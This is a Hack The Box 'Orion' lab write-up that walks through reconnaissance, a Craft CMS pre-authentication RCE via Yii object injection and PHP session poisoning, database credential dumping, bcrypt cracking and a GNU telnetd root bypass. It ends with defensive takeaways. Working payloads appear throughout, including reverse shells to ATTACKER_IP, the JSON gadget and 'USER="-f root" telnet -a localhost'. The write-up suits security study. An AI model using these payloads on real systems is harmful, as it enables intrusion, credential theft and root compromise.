> HTML Page: [[HTML Pages/HTB/HTB Orion.html|Open HTML Page]]

## 1. Attack-Path Summary

```text
External Recon
    ↓
HTTP service fingerprinting
    ↓
Craft CMS 5.6.16 identified
    ↓
CVE-2025-32432 + Yii object-injection behavior
    ↓
PHP session poisoning
    ↓
Blind command execution
    ↓
Reverse shell as www-data
    ↓
Read Craft CMS .env
    ↓
Access MariaDB and dump users
    ↓
Crack bcrypt hash → optional user shell
    ↓
Enumerate processes and localhost services
    ↓
Discover inetutils-inetd serving telnet
    ↓
CVE-2026-24061 USER-variable authentication bypass
    ↓
Root shell
```
## 2. Target Profile

|Item|Observation|
|---|---|
|Operating system|Ubuntu Linux|
|External ports|TCP 22 and TCP 80|
|Web server|Nginx|
|Application|Craft CMS|
|Framework|Yii 2|
|Database|MariaDB/MySQL|
|Initial shell|`www-data`|
|Local privilege-escalation service|GNU `inetutils-inetd` running `telnetd`|
|Primary vulnerabilities|CVE-2025-32432, CVE-2024-58136, CVE-2026-24061|
|Secondary vulnerability investigated|CVE-2026-32746|

---

# 3. Reconnaissance Methodology

## 3.1 Full TCP Scan

```
sudo nmap -p- --reason --min-rate 10000 TARGET_IP
```

### Why

- Identifies the complete externally exposed attack surface.
- `--reason` explains why Nmap assigned each state.
- A high `--min-rate` accelerates scanning in controlled lab environments.

## 3.2 Service and Script Scan

```
sudo nmap -p 22,80 -sCV TARGET_IP
```

### Key signals

- OpenSSH version may reveal the base distribution.
- Nginx headers may reveal the server version.
- HTTP redirects may disclose the required virtual host.
- TTL values can provide weak supporting evidence about the target operating system.

## 3.3 Add the Virtual Host

```
echo "TARGET_IP orion.htb" | sudo tee -a /etc/hosts
```

## 3.4 Virtual-Host Fuzzing

```
ffuf \
  -u http://TARGET_IP/ \
  -H "Host: FUZZ.orion.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs BASELINE_SIZE
```

### Hint

Establish a baseline response first. Filter by size, word count, line count, or status code so wildcard responses do not create false positives.

## 3.5 Content Discovery

```
feroxbuster \
  -u http://orion.htb \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Useful discoveries include:

```
/admin
/admin/login
/assets/
/index.php
```

### Methodology lesson

For open-source applications, directory brute forcing should complement product-specific research. Once Craft CMS is identified, check its documented default routes and control-panel paths instead of relying only on generic wordlists.

---

# 4. Web Fingerprinting

## 4.1 Inspect Response Headers

```
curl -I http://orion.htb/
```

Look for headers such as:

```
Server: nginx
X-Powered-By: Craft CMS
```

## 4.2 Trigger Controlled Errors

Request nonexistent routes:

```
curl -i http://orion.htb/nonexistent-route
curl -i http://orion.htb/nonexistent.php
```

Compare how the application and web server handle each request.

### Valuable error-page disclosures

- Framework name
- Framework version
- Application filesystem path
- Development mode
- Stack traces
- Controller or route names

## 4.3 Identify the CMS Version

Check:

```
/admin
/admin/login
HTML source
Static assets
Error pages
Response headers
```

### Orion-specific finding

Craft CMS `5.6.16` was vulnerable because the relevant fix was introduced in `5.6.17`.

---

# 5. Vulnerability Research Workflow

Once the exact product and version are known, search using combinations such as:

```
Craft CMS 5.6.16 exploit
Craft CMS 5.6.16 CVE
Craft CMS image transform RCE
Craft CMS generate-transform exploit
Yii __class object injection
```

Prioritize:

1. Vendor advisories
2. NVD or national vulnerability databases
3. Original security-research reports
4. Public proof-of-concept repositories
5. Metasploit modules

### Orion vulnerability chain

|Vulnerability|Role|
|---|---|
|CVE-2025-32432|Pre-authentication Craft CMS remote-code-execution path|
|CVE-2024-58136|Yii object-instantiation behavior involving `class` and `__class`|
|CVE-2023-41892|Earlier related Craft CMS RCE useful for historical context|

---

# 6. Craft CMS Pre-Authentication RCE

## 6.1 Vulnerable Endpoint

```
/index.php?p=admin/actions/assets/generate-transform
```

Alternate route form:

```
/admin/actions/assets/generate-transform
```

The endpoint processes image-transform configuration supplied by the client.

## 6.2 Required Request State

Obtain:

- `CraftSessionId` cookie
- `CRAFT_CSRF_TOKEN` cookie
- Hidden CSRF form token

```
curl -s -v http://orion.htb/admin/login 2>&1 \
  | grep -i -E 'set-cookie|type="hidden"'
```

### Operational distinction

The CSRF cookie and the hidden CSRF token are different values. Preserve the complete cookie values and place the hidden token in the expected CSRF header.

Example structure:

```
Cookie: CraftSessionId=SESSION_ID; CRAFT_CSRF_TOKEN=COOKIE_VALUE
X-CSRF-Token: FORM_TOKEN
Content-Type: application/json
```

---

# 7. Yii Object-Injection Primitive

## 7.1 Core Concept

Craft validates the expected `class` property, while affected Yii behavior gives precedence to attacker-controlled `__class`.

Conceptual structure:

```
{
  "handle": {
    "as behavior": {
      "class": "Allowed\\Craft\\Class",
      "__class": "Attacker\\Selected\\Class"
    }
  }
}
```

### Why this matters

The application validates one class name, but the framework instantiates another. The attacker can select a framework class whose constructor, destructor, callback, or file-loading behavior becomes an execution gadget.

---

# 8. Proof of Vulnerability

A safe proof can use a callable that produces a recognizable server-side effect.

Conceptual gadget:

```
{
  "assetId": 1,
  "handle": {
    "width": 123,
    "height": 123,
    "as session": {
      "class": "craft\\behaviors\\FieldLayoutBehavior",
      "__class": "GuzzleHttp\\Psr7\\FnStream",
      "__construct()": [
        {}
      ],
      "_fn_close": "phpinfo"
    }
  }
}
```

### Indicators of success

- PHP information page
- Distinctive server-side exception
- Callback-generated response
- Out-of-band network traffic

### Hint

A nominally required `assetId` may not always need to reference a real asset. Test the lowest-complexity value before spending time enumerating valid objects.

---

# 9. PHP Session Poisoning

## 9.1 Session-File Location

Common PHP session path:

```
/var/lib/php/sessions/sess_<CraftSessionId>
```

## 9.2 Poison the Session

Request an authenticated-only route while unauthenticated and place PHP code in a query parameter:

```
/index.php?p=admin/dashboard&a=<?=system($_GET['cmd']);?>
```

The application redirects to the login page but may store the original requested URL in the session.

Example:

```
curl -i \
  -b "CraftSessionId=SESSION_ID; CRAFT_CSRF_TOKEN=COOKIE_VALUE" \
  "http://orion.htb/index.php?p=admin/dashboard&a=%3C%3F%3Dsystem(%24_GET%5B%27cmd%27%5D)%3B%3F%3E"
```

## 9.3 Execution Gadget

Use Yii's `PhpManager` class and point `itemFile` to the poisoned session file:

```
{
  "assetId": 1,
  "handle": {
    "width": 123,
    "height": 123,
    "as hack": {
      "class": "\\craft\\behaviors\\FieldLayoutBehavior",
      "__class": "\\yii\\rbac\\PhpManager",
      "__construct()": [
        {
          "itemFile": "/var/lib/php/sessions/sess_SESSION_ID"
        }
      ]
    }
  }
}
```

### Why it works

`PhpManager` expects a PHP file containing authorization data. Loading the attacker-controlled session file causes the embedded PHP code to execute.

---

# 10. Blind Command-Execution Validation

The exploit request may return HTTP `500` even when the command runs successfully.

Do not rely only on the response body.

## 10.1 ICMP Verification

On the attacker host:

```
sudo tcpdump -ni tun0 icmp
```

Trigger:

```
cmd=ping -c 1 ATTACKER_IP
```

URL-encoded example:

```
cmd=ping%20-c%201%20ATTACKER_IP
```

## 10.2 TCP Callback Verification

Listener:

```
nc -lvnp 9001
```

Trigger:

```
bash -c 'echo test >/dev/tcp/ATTACKER_IP/9001'
```

## 10.3 HTTP Verification

Listener:

```
python3 -m http.server 8000
```

Trigger:

```
curl http://ATTACKER_IP:8000/rce-confirmed
```

### Methodology lesson

Treat outbound interaction as the source of truth when exploiting blind RCE. An application crash can occur after the attacker-controlled callable has already executed.

---

# 11. Reverse Shell

Listener:

```
nc -lvnp 443
```

Payload:

```
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```

URL-encoded form:

```
bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/443%200%3E%261'
```

### Alternatives

```
sh -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

---

# 12. Shell Stabilization

```
script /dev/null -c bash
```

Background the shell:

```
Ctrl+Z
```

Configure the local terminal:

```
stty raw -echo
fg
```

Then:

```
reset
```

Set terminal variables:

```
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 columns 120
```

---

# 13. Metasploit Alternative

Search:

```
search craftcms
```

Module:

```
exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
```

Typical setup:

```
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS orion.htb
set VHOST orion.htb
set LHOST tun0
set LPORT 4444
check
run
```

### When to use manual exploitation

Use the manual path when you need to:

- Understand the underlying object-injection chain
- Adapt the exploit to unusual routing
- Debug CSRF or session handling
- Select a different gadget
- Validate detection controls
- Operate without Metasploit

### When to use Metasploit

Use the module when you need rapid, repeatable exploitation after independently confirming the target and scope.

---

# 14. Post-Exploitation Enumeration

## 14.1 Identity and Context

```
id
whoami
hostname
pwd
uname -a
cat /etc/os-release
```

## 14.2 Interactive Users

```
cat /etc/passwd | grep 'sh$'
```

```
ls -la /home
```

## 14.3 Web Application Root

Likely Craft locations:

```
/var/www/html/craft
/var/www/craft
/srv/www/craft
```

Search:

```
find /var/www -maxdepth 4 -type f \
  \( -name ".env" -o -name "composer.json" -o -name "config.php" \) \
  2>/dev/null
```

## 14.4 Search for Secrets

```
grep -RniE \
  'password|passwd|secret|token|api[_-]?key|database|db_user|db_pass' \
  /var/www 2>/dev/null
```

---

# 15. Craft CMS Configuration Files

High-value files:

```
.env
config/
composer.json
composer.lock
storage/logs/
web/index.php
```

Inspect:

```
cat /var/www/html/craft/.env
```

Typical secrets:

```
CRAFT_SECURITY_KEY
CRAFT_DB_SERVER
CRAFT_DB_PORT
CRAFT_DB_DATABASE
CRAFT_DB_USER
CRAFT_DB_PASSWORD
PRIMARY_SITE_URL
```

### Hints

- Test database credentials against the database before assuming they are reused by system users.
- `CRAFT_DEV_MODE=true` increases the chance of verbose errors and path disclosure.
- `composer.lock` provides precise dependency versions for vulnerability research.
- Application secrets may enable session forgery or cryptographic attacks even when they do not provide direct login access.

---

# 16. MariaDB Enumeration

Connect:

```
mysql -u DB_USER -p
```

Or:

```
mysql -h 127.0.0.1 -P 3306 -u DB_USER -p
```

## 16.1 Enumerate Databases

```
SHOW DATABASES;
```

## 16.2 Select the Application Database

```
USE orion;
SHOW TABLES;
```

## 16.3 Inspect the User Table

```
DESCRIBE users;
```

```
SELECT id, admin, username, email, password
FROM users;
```

### High-value columns

```
username
email
password
admin
active
locked
suspended
lastLoginDate
lastLoginAttemptIp
```

---

# 17. Password-Hash Triage

## 17.1 Identify the Hash

A PHP bcrypt hash commonly begins with:

```
$2y$
```

Hashcat mode:

```
3200 — bcrypt $2*$, Blowfish (Unix)
```

## 17.2 Crack With Hashcat

```
hashcat -m 3200 hash.txt \
  /usr/share/wordlists/rockyou.txt
```

Show cracked results:

```
hashcat -m 3200 hash.txt --show
```

## 17.3 Practical bcrypt Strategy

Bcrypt is intentionally slow. Use targeted candidate sets before large wordlists:

```
hashcat -m 3200 hash.txt company_words.txt
hashcat -m 3200 hash.txt probable_passwords.txt -r rules/best64.rule
```

### Candidate sources

- Company name
- Domain name
- Usernames
- Email local parts
- Page content
- Product names
- Passwords found in configuration files
- Common seasonal patterns

---

# 18. Credential Validation

## 18.1 Switch User Locally

```
su - USERNAME
```

## 18.2 SSH Validation

```
ssh USERNAME@orion.htb
```

Avoid placing passwords directly on the command line in real environments. Command-line passwords may appear in process listings, shell history, audit logs, or terminal recordings.

### Important Orion lesson

The intermediate user shell was optional. The final privilege-escalation path could be executed directly from the `www-data` shell.

---

# 19. Linux Privilege-Escalation Enumeration

## 19.1 Baseline Checks

```
sudo -l
id
groups
```

## 19.2 SUID Files

```
find / -perm -4000 -type f 2>/dev/null
```

## 19.3 Capabilities

```
getcap -r / 2>/dev/null
```

## 19.4 Cron and Timers

```
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers --all
```

## 19.5 Full Process List

```
ps auxww
```

Alternative views:

```
ps -ef --forest
pstree -ap
```

### High-value process anomalies

- Legacy services on modern systems
- Custom binaries under `/usr/local`
- Root-owned interpreters running scripts
- Development servers
- Unusual socket activation
- Services bound only to localhost
- Processes whose package is not installed by default

---

# 20. Detecting inetd

Search the process list:

```
ps auxww | grep -i '[i]netd'
```

Inspect configuration:

```
cat /etc/inetd.conf
```

List package information:

```
dpkg -l | grep -i inetutils
```

```
apt-cache policy inetutils-inetd inetutils-telnetd
```

### inetd configuration format

```
service socket protocol wait user server arguments
```

Example:

```
127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd
```

This reveals:

- Service: telnet
- Bind address: localhost
- Port: standard telnet port
- Execution user: root
- Server binary: custom or local `telnetd`

---

# 21. Local Network-Service Enumeration

Use multiple tools because process ownership restrictions may hide details.

```
ss -lntup
```

```
netstat -lntup
```

```
lsof -i -P -n
```

```
cat /proc/net/tcp
```

Orion exposed telnet only on:

```
127.0.0.1:23
```

### Methodology lesson

External scanning cannot see loopback-only services. Always repeat service enumeration after obtaining code execution.

---

# 22. Service-Version Identification

```
telnetd --version
```

```
/usr/local/sbin/telnetd --version
```

```
strings /usr/local/sbin/telnetd | head
```

```
dpkg -S /usr/local/sbin/telnetd
```

### Research query pattern

```
"GNU inetutils telnetd 2.7 CVE"
"telnetd 2.7 authentication bypass"
"inetutils 2.7 exploit"
```

Two relevant vulnerabilities surfaced:

|CVE|Issue|Practical role|
|---|---|---|
|CVE-2026-24061|`USER` environment-variable authentication bypass|Direct root path|
|CVE-2026-32746|LINEMODE SLC out-of-bounds write|Interesting but unnecessary for this box|

### Decision rule

Prefer the vulnerability that matches:

1. Exact installed version
2. Reachable service configuration
3. Available prerequisites
4. Lowest operational complexity
5. Highest reliability

---

# 23. CVE-2026-24061 Authentication Bypass

## 23.1 Vulnerability Concept

GNU `telnetd` passes the client-controlled `USER` environment variable to `/usr/bin/login`.

An attacker supplies:

```
-f root
```

The login program interprets this as its own `-f` option, which permits a pre-authenticated login for the named account.

This is an argument-injection or option-injection condition caused by failing to sanitize a value crossing a trust boundary.

## 23.2 Exploit

```
USER="-f root" telnet -a localhost
```

Expected result:

```
root@target:~#
```

## 23.3 Critical Flag

```
-a
```

This tells the telnet client to perform automatic login and send the `USER` environment value.

## 23.4 Preconditions

- Vulnerable GNU inetutils `telnetd`
- Reachable telnet service
- Client capable of sending the `USER` environment value
- `telnetd` invokes a compatible `login` implementation
- Service runs with sufficient privileges

### Key insight

A localhost-only root service is still exploitable after obtaining any local shell. Network exposure is contextual, not absolute.

---

# 24. CVE-2026-32746 Triage

Issue:

```
Out-of-bounds write in GNU inetutils telnetd LINEMODE SLC handling
```

Use a detector only after reviewing it:

```
python3 cve-2026-32746.py
```

### Why it was not the preferred route

- Exploitation is more complex.
- Reliable RCE was not required.
- A simpler authentication bypass existed.
- Easy-box methodology favors the cleanest viable path.

### General lesson

Do not choose a technically impressive vulnerability when a lower-complexity path already satisfies the objective.

---

# 25. Tool Reference

|Tool|Use|
|---|---|
|`nmap`|Port, service, script, and version scanning|
|`ffuf`|Virtual-host and content fuzzing|
|`feroxbuster`|Recursive web-content discovery|
|`curl`|Header inspection, cookie capture, request reproduction|
|Burp Proxy|Capture browser traffic|
|Burp Repeater|Modify and replay exploit requests|
|`tcpdump`|Confirm blind RCE through outbound traffic|
|`nc`|Reverse-shell listener and TCP validation|
|Metasploit|Automated Craft CMS exploitation|
|`script`|Allocate a pseudo-terminal|
|`mysql`|MariaDB enumeration|
|`hashcat`|bcrypt cracking|
|`ps` / `pstree`|Process enumeration|
|`ss` / `netstat`|Local listener discovery|
|`lsof`|Map processes to files and sockets|
|`telnet`|Access the localhost telnet service|
|`grep` / `find`|Configuration and secret discovery|

---

# 26. Reusable Exploitation Checklist

## External Recon

- [ ]  Scan all TCP ports
- [ ]  Run service and default-script detection
- [ ]  Record redirects and hostnames
- [ ]  Add required virtual hosts
- [ ]  Fuzz subdomains and directories
- [ ]  Compare web-server and application error behavior

## Application Fingerprinting

- [ ]  Identify product and version
- [ ]  Identify the underlying framework
- [ ]  Check administrative routes
- [ ]  Inspect response headers
- [ ]  Trigger controlled error pages
- [ ]  Search exact-version advisories

## Craft CMS Exploitation

- [ ]  Retrieve session and CSRF cookies
- [ ]  Retrieve the hidden CSRF token
- [ ]  Confirm the transform endpoint
- [ ]  Test `class` versus `__class`
- [ ]  Confirm execution with a harmless callback
- [ ]  Poison the PHP session
- [ ]  Point `PhpManager.itemFile` at the session file
- [ ]  Verify blind execution out of band
- [ ]  Trigger a reverse shell
- [ ]  Stabilize the terminal

## Post-Exploitation

- [ ]  Enumerate users and shells
- [ ]  Locate the Craft application root
- [ ]  Read `.env`
- [ ]  Test database credentials
- [ ]  Enumerate the application database
- [ ]  Extract user hashes
- [ ]  Crack or reuse credentials when useful

## Privilege Escalation

- [ ]  Check `sudo -l`
- [ ]  Enumerate SUID and capabilities
- [ ]  Inspect cron jobs and timers
- [ ]  Dump the full process list
- [ ]  Enumerate all local listeners
- [ ]  Investigate non-default services
- [ ]  Inspect service configuration
- [ ]  Determine exact versions
- [ ]  Compare candidate CVEs
- [ ]  Select the simplest reliable exploit

---

# 27. High-Value Hints

1. **Version precision matters.** A one-patch difference separated the vulnerable Craft release from the fixed version.
2. **Framework behavior can invalidate application checks.** Craft validated `class`, but Yii interpreted `__class`.
3. **Session files are executable data when a gadget includes them as PHP.** Storage and execution contexts can combine into RCE.
4. **Redirects can still create useful state.** The dashboard request failed authentication but stored attacker-controlled data in the session.
5. **HTTP 500 does not prove exploitation failed.** Validate blind execution through ICMP, TCP, DNS, or HTTP callbacks.
6. **Start with configuration files after gaining a web shell.** `.env` often contains the fastest route to databases, APIs, or adjacent services.
7. **Do not assume password reuse.** Test secrets methodically against each relevant service.
8. **Bcrypt requires focused cracking.** Start with targeted candidates and mode `3200`.
9. **Inspect every root process.** An unusual service installed manually on a modern distribution is rarely accidental in a lab.
10. **Enumerate loopback listeners.** Localhost-only services frequently become privilege-escalation targets.
11. **Confirm the exact service implementation.** “Telnet” alone is insufficient; the vulnerability applied to GNU inetutils `telnetd`.
12. **Choose the shortest valid path.** The user compromise was useful for the flag but unnecessary for root.
13. **Understand client flags.** The telnet bypass depended on `-a` sending the crafted `USER` value.
14. **Treat environment variables as untrusted input.** Passing them into privileged command-line arguments can create option injection.
15. **Separate discovery from exploitation.** First prove version, reachability, and preconditions; then run the exploit.

---

# 28. Defensive Takeaways

## Craft CMS

- Upgrade Craft CMS beyond vulnerable versions.
- Upgrade Yii to a version containing the relevant object-instantiation fix.
- Disable development mode in production.
- Restrict detailed exception pages.
- Monitor requests to asset-transform action endpoints.
- Alert on JSON containing both `class` and `__class`.
- Alert on suspicious `as <name>` behavior properties.
- Monitor PHP session files for `<?`, `<?=`, `system`, `exec`, or network callbacks.
- Prevent PHP execution from writable session and temporary directories.
- Restrict outbound network access from PHP-FPM workers.

## Secrets and Database

- Do not use the database root account for a web application.
- Store secrets outside the web deployment tree.
- Apply least-privilege database grants.
- Rotate exposed credentials.
- Monitor local database connections originating from web-worker contexts.

## Telnet and inetd

- Remove telnet services where possible.
- Remove legacy `inetd` unless operationally required.
- Patch vulnerable GNU inetutils versions.
- Restrict privileged services even on loopback.
- Monitor unusual `USER` environment values such as strings beginning with `-`.
- Alert on telnet sessions spawning UID 0 shells.
- Replace cleartext legacy protocols with authenticated encrypted alternatives.

---

# 29. Minimal Command Sequence

```bash
# Recon
sudo nmap -p- --reason --min-rate 10000 TARGET_IP
sudo nmap -p 22,80 -sCV TARGET_IP
echo "TARGET_IP orion.htb" | sudo tee -a /etc/hosts

# Web discovery
curl -I http://orion.htb/
feroxbuster -u http://orion.htb

# Capture Craft session and CSRF values
curl -s -v http://orion.htb/admin/login 2>&1 \
  | grep -i -E 'set-cookie|type="hidden"'

# Blind RCE validation
sudo tcpdump -ni tun0 icmp

# Reverse-shell listener
nc -lvnp 443

# Shell upgrade
script /dev/null -c bash

# Application secrets
find /var/www -name .env -o -name composer.lock 2>/dev/null
cat /var/www/html/craft/.env

# Database
mysql -h 127.0.0.1 -u DB_USER -p
```

```sql
SHOW DATABASES;
USE orion;
SHOW TABLES;
SELECT id, admin, username, email, password FROM users;
```

```bash
# Hash cracking
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# Local privilege-escalation enumeration
sudo -l
ps auxww
ss -lntup
cat /etc/inetd.conf
telnetd --version

# Telnet authentication bypass
USER="-f root" telnet -a localhost
```